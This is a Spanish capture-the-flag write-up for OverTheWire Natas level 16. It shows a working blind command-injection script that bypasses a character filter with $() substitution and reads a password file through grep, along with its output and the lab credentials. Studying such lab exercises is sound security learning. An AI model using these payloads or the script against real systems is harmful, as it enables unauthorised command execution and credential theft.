#Natas Level 15 → Level 16

Username: natas16

URL:      http://natas16.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas16.natas.labs.overthewire.org** 
- **Usuario    : natas16**
- **Contraseña : WaIHEacj63wnNIBROHeqi3p9t0m5nhmh**

La contraseña la hemos sacado del nivel anterior.

Entramos en la página web y nos muestra un mensaje parecido a la prueba anterior indicando que se han filtrado incluso más caracteres que en la prueba anterior.

```html
For security reasons, we now filter even more on certain characters

Find words containing: 
Search

Output:
```

Encontramos un campo de texto donde podemos buscar palabras dentro de un fichero, al igual que hicimos en alguna prueba anterior.

Antes de meternos en harina, vamos a mirar el código fuente y ver que han podido cambiar.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) 
{
    $key = $_REQUEST["needle"];
}

if($key != "") 
{
    if(preg_match('/[;|&`\'"]/',$key)) 
    {
        print "Input contains an illegal character!";
    } else 
    {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Vamos a comparar con la prueba nº 10 de Natas en la que también filtraban los caracteres:

Natas10
```php
if(preg_match('/[;|&]/',$key))
```
Natas16
```php
if(preg_match('/[;|&`\'"]/',$key)) 
```

Al igual que en la prueba Natas10 intentamos poner la mascara Wildcard(.*) y vemos que nos devuelve el contenido de todo el fichero.

Intentamos hacer el mismo truco poniendo el siguiente comando, pero no nos funciona.

```bash
.* /etc/natas_webpass/natas17
```

Tenemos que intentar otra cosa. Vamos a analizar que caracteres filtra y podríamos sacar provecho de lo que no filtra.

Filtra los valores ```bash (;, |, &, `, ', ")``` pero no los valores **$** y **()** entre otros. 

Investigando un poco por internet nos encontramos un comando o truco en bash que nos puede servir de ayuda.

El siguiente comando
```bash 
`cat /etc/natas_webpass/natas17`
```
es lo mismo que 

```bash 
$(cat /etc/natas_webpass/natas17)
```

Nos fijamos que no utilizamos ningún caracter prohibido de la lista que han bloqueado y podemos obtener los mismos resultados. 

Bien, hemos pasado el primer filtro y ahora tenemos que montar la consulta para que nos muestre la contraseña del siguiente nivel.

Esta prueba es muy parecida a la del nivel anterior, ya que tenemos que ver si la búsqueda nos da algún resultado o no. 

Tenemos que conseguir la consulta que realizaremos sea parecida a esta:

```bash
grep -i $(grep -E ^a.* /etc/natas_webpass/natas17)treasure dictionary.txt
```

NOTA: Para llegar a este punto he tenido que preguntar en el foro ya que no sabía como seguir :smile:

Lo que vamos a intentar es ver si el principio del password del fichero **/etc/natas_webpass/natas17** coincide con la letra que vamos a buscar **^a.** con **grep** y añadiendole una palabra que si existe en el diccionario. Dicho así suena muy raro pero tiene su lógica.

Por ejemplo, vamos a ver si la password del fichero **natas17** empiezacon con la letra **a**. Si la contraseña no empieza por la letra **a** el resultado de la consulta **$(grep -E ^a.* /etc/natas_webpass/natas17)treasure** será un campo vacío ya que no habrá encontrado ninguna coincidencia:

```bash
$(grep -E ^a.* /etc/natas_webpass/natas17)treasure
<campoVacio>+treasure
Buscaremos la palabra "treasure" en el diccionario
```

Si la palabra existe en el diccionario, nos devolverá un mensaje en el output indicando que **treasure** si se encuentra en el **dictionary.txt**

Ahora por el contrario encontramos que la primera letra del password del fichero nata17 coincide con alguna que hayamos puesto, el resultado sería una concatenación de ambas palabras y por lo tanto se le añadiría a la palabra treasure, haciendo que el resultado no de ningún output.

```bash
$(grep -E ^8.* /etc/natas_webpass/natas17)treasure
8+treasure
Buscaremos la palabra "8treasure" en el diccionario
```

Aquí he utilizado el número **8** que sí está como primera letra del password del fichero. Como podéis ver, el resultado es positivo y nos devolverá el string **8treasure**.

Si buscamos ese término en el campo de búsqueda, no nos saldrá ningún resultado ya que no existe esa palabra. 

¡BIEN! Ahora ya sabemos que si el campo **output** muestra el mensaje **treasure** es porque la letra que buscábamos en el password no existe y por lo tanto no vale. Si por el contrario no recibimos ningún **output** es porque ha encontrado una letra en el fichero de password, la ha concatenado a la nuestra y al realizar la búsqueda no ha mostrado ningún resultado.

Es un poco alrevesado, lo sé :smile:

Bueno, ya que haciendolo a mano tardaríamos una eternidad, vamos a coger el código del nivel anterior y vamos a cambiar los parámetros para que nos devuelva la contraseña.

Lo llamaremos **blindNatas16Injection.py**

```python
import httplib2
import urllib
import time


h = httplib2.Http()
h.add_credentials('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

passTemporal        = "";
letras              = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
posicion            = 0

letraPassExiste     = 0
letraPassNoExiste   = 0


while posicion < len(letras):
        # grep -i $(grep -E ^a.* /etc/natas_webpass/natas17)Africans dictionary.txt <- Como quedaria la consulta final
        query = urllib.urlencode(dict(needle="$(grep -E ^" + passTemporal + letras[posicion] + ".* /etc/natas_webpass/natas17)treasure"))
        resp, contenido = h.request("http://natas16.natas.labs.overthewire.org/index.php?" + query, method="GET")
        if ("treasure" not in str(contenido)):
                passTemporal += letras[posicion];
                print("Nueva password encontrada: " + passTemporal)
                posicion = 0
                letraPassExiste +=1
                if (len(passTemporal)==32):
                        break;
                continue
        else: 
                letraPassNoExiste +=1
        posicion += 1

print "-"*70
print "Pruebas Erroneas       = {0}".format(letraPassNoExiste)
print "Pruebas Satisfactorias = {0}".format(letraPassExiste)        
print "-"*70
print "Password Natas17 = {0}".format(passTemporal)
print "-"*70
```

Lo ejecutamos y esperamos a que nos devuelva la contraseña para el nivel **Nata17** :smile:

```bash
ikerburguera@:~/Desktop$ python blindNatas16Injection.py 
Nueva password encontrada: 8
Nueva password encontrada: 8P
Nueva password encontrada: 8Ps
Nueva password encontrada: 8Ps3
Nueva password encontrada: 8Ps3H
Nueva password encontrada: 8Ps3H0
Nueva password encontrada: 8Ps3H0G
Nueva password encontrada: 8Ps3H0GW
Nueva password encontrada: 8Ps3H0GWb
Nueva password encontrada: 8Ps3H0GWbn
Nueva password encontrada: 8Ps3H0GWbn5
Nueva password encontrada: 8Ps3H0GWbn5r
Nueva password encontrada: 8Ps3H0GWbn5rd
Nueva password encontrada: 8Ps3H0GWbn5rd9
Nueva password encontrada: 8Ps3H0GWbn5rd9S
Nueva password encontrada: 8Ps3H0GWbn5rd9S7
Nueva password encontrada: 8Ps3H0GWbn5rd9S7G
Nueva password encontrada: 8Ps3H0GWbn5rd9S7Gm
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmA
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAd
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdg
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQ
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQN
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNd
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdk
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkh
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
Nueva password encontrada: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
----------------------------------------------------------------------
Pruebas Erroneas       = 926
Pruebas Satisfactorias = 32
----------------------------------------------------------------------
Password Natas17 = 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
----------------------------------------------------------------------
```

**FLAG** = {8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw}





